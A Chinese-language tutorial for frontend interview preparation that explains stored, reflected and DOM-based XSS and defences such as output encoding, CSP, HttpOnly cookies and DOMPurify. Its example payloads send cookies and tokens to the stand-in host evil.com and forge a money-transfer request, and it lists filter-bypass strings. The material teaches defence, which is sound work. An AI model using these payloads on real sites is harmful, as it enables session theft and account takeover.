---
sidebar_position: 10
title: "XSS 攻击详解与防御"
difficulty: "hard"
tags: ["network", "security", "xss", "injection", "frontend"]
---

# XSS 攻击详解与防御

> **"任何用户输入都是不可信的"** —— XSS 是 Web 安全中最常见的攻击类型，也是前端面试中的高频考点。

## 一、XSS 攻击原理

### 1.1 什么是 XSS？

```
XSS（Cross-Site Scripting）攻击原理
═══════════════════════════════════════════════════════

攻击者将恶意脚本注入到网页中
        ↓
用户访问该网页
        ↓
浏览器执行恶意脚本（无法区分合法脚本与恶意脚本）
        ↓
窃取 Cookie、Token、敏感信息
冒充用户执行操作（转账、发帖、修改密码）
重定向到钓鱼网站
键盘记录、截屏、挖矿
```

### 1.2 XSS 的三种类型对比

```
XSS 类型全景图
═══════════════════════════════════════════════════════

┌─────────────┬──────────────┬──────────────┬──────────────┐
│   特性       │  存储型 XSS   │  反射型 XSS   │  DOM 型 XSS  │
├─────────────┼──────────────┼──────────────┼──────────────┤
│ 恶意脚本来源  │ 服务器数据库   │ URL 参数      │ URL/前端存储  │
│ 是否经过服务端 │ 是           │ 是           │ 否（纯前端）   │
│ 触发方式     │ 访问页面自动   │ 点击恶意链接   │ 点击恶意链接   │
│ 危害范围     │ 所有访问用户   │ 点击链接的用户  │ 点击链接的用户  │
│ 危险等级     │ ★★★★★       │ ★★★★        │ ★★★         │
│ 典型场景     │ 评论区、论坛   │ 搜索、跳转     │ 前端路由解析   │
└─────────────┴──────────────┴──────────────┴──────────────┘
```

## 二、三种 XSS 类型详解

### 2.1 存储型 XSS（最危险）

存储型 XSS 的恶意脚本被持久化保存在服务器端（数据库、文件系统等），当用户访问包含恶意脚本的页面时，服务器将恶意内容返回给浏览器并执行。

```html
<!-- ===== 攻击场景：论坛评论区 ===== -->

<!-- 攻击者提交的评论内容（恶意脚本隐藏在正常内容中） -->
<div>这篇文章写得真好！学到了很多。</div>
<script>
  // 1. 窃取用户 Cookie
  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;

  // 2. 窃取 localStorage 中的 Token
  const token = localStorage.getItem('token');
  new Image().src = 'https://evil.com/steal?token=' + token;

  // 3. 以用户身份执行操作
  fetch('/api/transfer', {
    method: 'POST',
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
  });
</script>
```

```
存储型 XSS 攻击流程
═══════════════════════════════════════════════════════

攻击者提交恶意评论 → 服务器存入数据库（未过滤）
        ↓
正常用户浏览该评论页面
        ↓
服务器从数据库取出内容返回 → 浏览器渲染并执行恶意脚本
        ↓
用户 Cookie/Token 被窃取 → 攻击者冒充用户
```

### 2.2 反射型 XSS

反射型 XSS 的恶意脚本通过 URL 参数传递给服务器，服务器将参数内容直接拼接到 HTML 页面中返回。

```javascript
// ===== 攻击场景：搜索功能 =====

// 服务器端代码（Node.js/Express，存在漏洞）
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 危险：直接将用户输入拼接到 HTML 中
  res.send(`
    <h1>搜索结果</h1>
    <p>您搜索的是：${query}</p>
    <p>未找到 "${query}" 的相关结果</p>
  `);
});

// 攻击者构造的恶意 URL：
// https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// 用户点击该链接后，服务器返回的 HTML：
// <p>您搜索的是：<script>document.location='https://evil.com/steal?cookie='+document.cookie</script></p>
```

### 2.3 DOM 型 XSS

DOM 型 XSS 完全在前端发生，恶意数据不经过服务器，而是通过前端 JavaScript 直接操作 DOM 时注入。

```javascript
// ===== 攻击场景：前端路由/URL 参数解析 =====

// 漏洞代码
const name = new URLSearchParams(location.search).get('name');
document.getElementById('welcome').innerHTML = `欢迎回来, ${name}!`;

// 攻击者构造的恶意 URL：
// https://example.com?name=<img src=x onerror="alert(document.cookie)">

// ===== 更多 DOM XSS 危险 API =====

// 1. innerHTML（最常见）
element.innerHTML = userInput;  // 危险

// 2. document.write
document.write(userInput);  // 危险

// 3. eval
eval(userInput);  // 极度危险

// 4. setTimeout / setInterval 的字符串参数
setTimeout(userInput, 1000);  // 危险

// 5. location.href / location.assign
location.href = userInput;  // javascript: 协议攻击

// 6. v-html（Vue）
// <div v-html="userInput"></div>  // 危险

// 7. dangerouslySetInnerHTML（React）
// <div dangerouslySetInnerHTML={{ __html: userInput }} />  // 危险
```

## 三、XSS 攻击真实案例

### 3.1 Samy 蠕虫（2005）

```
Samy 蠕虫事件
═══════════════════════════════════════════════════════

攻击平台：MySpace 社交网络
攻击类型：存储型 XSS
影响范围：24 小时内超过 100 万用户被感染

攻击原理：
1. 攻击者 Samy 在个人主页注入恶意 JavaScript
2. 浏览者访问该主页时，脚本自动执行
3. 脚本将攻击者加为好友，并在浏览者主页复制自身
4. 形成链式传播（蠕虫效应）

后果：
- Samy 成为 MySpace 最热门用户（百万好友）
- MySpace 被迫关闭维护
- Samy 被判缓刑和社区服务
```

### 3.2 百度贴吧 XSS 事件（2015）

```
百度贴吧 XSS 事件
═══════════════════════════════════════════════════════

攻击类型：存储型 XSS
攻击入口：贴吧帖子内容未充分过滤

攻击表现：
- 用户浏览帖子时自动跳转到外部网站
- 弹出广告窗口
- 部分用户被引导至钓鱼页面

根因：
- 服务端对用户输入的 HTML 内容过滤不严格
- 黑名单过滤被绕过（使用特殊编码）
```

## 四、XSS 防御手段

### 4.1 输出编码（最基本且最重要）

```javascript
// ===== HTML 实体编码 =====
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
document.getElementById('output').textContent = escapeHtml(userInput);
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// ===== JavaScript 上下文编码 =====
function escapeJs(str) {
  return str.replace(/[\\"']/g, '\\$&')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r');
}

// ===== URL 编码 =====
const safeUrl = encodeURIComponent(userInput);

// ===== CSS 编码 =====
function escapeCss(str) {
  return str.replace(/[^a-zA-Z0-9]/g, ch =>
    '\\' + ch.charCodeAt(0).toString(16) + ' '
  );
}
```

### 4.2 使用安全的 DOM API

```javascript
// ===== 危险 vs 安全的 API 对比 =====

// ❌ 危险：innerHTML
element.innerHTML = userInput;

// ✅ 安全：textContent（纯文本）
element.textContent = userInput;

// ❌ 危险：document.write
document.write(userInput);

// ✅ 安全：createElement + textContent
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// ❌ 危险：setAttribute 中使用 javascript: 协议
link.setAttribute('href', userInput);

// ✅ 安全：验证 URL 协议
function safeUrl(url) {
  const parsed = new URL(url, location.origin);
  if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
    return parsed.href;
  }
  return '#';
}
link.setAttribute('href', safeUrl(userInput));
```

### 4.3 前端框架自动转义

```jsx
// ===== React（自动转义） =====
function Comment({ text }) {
  // ✅ 安全：JSX 自动转义
  return <div>{text}</div>;

  // ❌ 危险：绕过转义
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// ===== Vue（自动转义） =====
// ✅ 安全：双花括号自动转义
// <div>{{ userInput }}</div>

// ❌ 危险：v-html 指令
// <div v-html="userInput"></div>

// ===== 模板引擎转义 =====
// EJS: <%= userInput %>    （自动转义）
// EJS: <%- userInput %>    （不转义，危险！）
// Handlebars: {{userInput}}    （自动转义）
// Handlebars: {{{userInput}}}  （不转义，危险！）
```

### 4.4 Content Security Policy（CSP）

```http
// ===== CSP 响应头配置 =====
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```html
<!-- 使用 nonce 的 script 标签 -->
<script nonce="abc123">
  // 只有带正确 nonce 的脚本才会执行
  const app = new Application();
  app.init();
</script>

<!-- 恶意注入的脚本（没有 nonce，被 CSP 阻止执行） -->
<script>document.cookie</script>
<!-- 浏览器控制台报错：Refused to execute inline script because it violates CSP -->
```

### 4.5 HttpOnly Cookie

```javascript
// ===== 服务端设置 HttpOnly Cookie =====

// Express.js
app.use(session({
  cookie: {
    httpOnly: true,   // 禁止 JavaScript 读取
    secure: true,     // 仅 HTTPS 传输
    sameSite: 'strict', // 防止 CSRF
    maxAge: 24 * 60 * 60 * 1000
  }
}));

// 即使 XSS 攻击成功，document.cookie 也无法获取该 Cookie
// JavaScript 输出：""（空字符串）
```

### 4.6 输入验证（白名单策略）

```javascript
// ===== 服务端输入验证 =====

// ❌ 黑名单（容易被绕过）
function isBlacklisted(input) {
  const blacklist = ['<script>', 'javascript:', 'onerror='];
  return !blacklist.some(item => input.includes(item));
  // 绕过方式：<scr<script>ipt>、<SCRIPT>、&#x3C;script>
}

// ✅ 白名单（只允许安全内容）
function sanitizeInput(input) {
  // 只允许字母、数字、中文、常见标点
  return input.replace(/[<>\"'&]/g, '');
}

// ✅ 使用成熟库进行 HTML 净化
// npm install dompurify
const DOMPurify = require('dompurify');

const dirty = '<img src=x onerror="alert(1)"><p>正常内容</p>';
const clean = DOMPurify.sanitize(dirty);
// 输出：<p>正常内容</p>（onerror 被移除）

// 配置允许的标签和属性
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title']
});
```

## 五、防御方案总结

```
XSS 防御方案总结
═══════════════════════════════════════════════════════

防御层次           方法                    防御目标
───────────────  ──────────────────────  ───────────────
输入层            输入验证（白名单）         过滤恶意输入
                HTML 净化（DOMPurify）    允许安全 HTML

输出层            HTML 实体编码            防止 HTML 注入
                JavaScript 编码          防止 JS 注入
                URL 编码                 防止 URL 注入

执行层            CSP 策略                 限制脚本来源
                HttpOnly Cookie          防止 Cookie 窃取
                安全的 DOM API           避免危险操作

框架层            React/Vue 自动转义        自动防护
                模板引擎自动转义           自动防护

传输层            HTTPS                    防止中间人篡改
                SRI 子资源完整性           防止 CDN 篡改
```

## 六、面试高频问题

### Q1：XSS 的三种类型有什么区别？

```
回答要点：
1. 存储型：恶意脚本存储在服务器，影响所有访问用户，最危险
2. 反射型：恶意脚本在 URL 中，需要用户点击链接触发
3. DOM 型：完全在前端发生，不经过服务器

三者的核心区别：
- 存储型和反射型需要服务端参与（服务器将恶意内容返回给浏览器）
- DOM 型完全由前端 JavaScript 处理，服务端不参与
```

### Q2：如何防御 XSS 攻击？

```
回答要点（按优先级排序）：
1. 输出编码 —— 最基本、最重要，根据上下文选择编码方式
2. CSP 策略 —— 限制脚本来源，是 XSS 的终极防线
3. HttpOnly Cookie —— 即使 XSS 成功也无法窃取 Cookie
4. 输入验证 —— 白名单策略，过滤危险字符
5. 使用安全 API —— textContent 代替 innerHTML
6. 前端框架 —— 利用自动转义机制
```

### Q3：CSP 如何防御 XSS？

```
回答要点：
1. 限制脚本来源：script-src 'self' 只允许同源脚本
2. 禁止内联脚本：不使用 'unsafe-inline'
3. 使用 nonce/hash：只允许白名单中的内联脚本执行
4. 限制 eval：不使用 'unsafe-eval'
5. 报告模式：先用 Content-Security-Policy-Report-Only 观察影响
```

### Q4：innerHTML 和 textContent 的安全区别？

```
回答要点：
1. innerHTML：会解析 HTML 标签，可能导致 XSS
2. textContent：只处理纯文本，自动转义 HTML 标签
3. 使用场景：显示用户输入时，必须使用 textContent
4. 如果需要富文本：使用 DOMPurify 净化后再使用 innerHTML
```
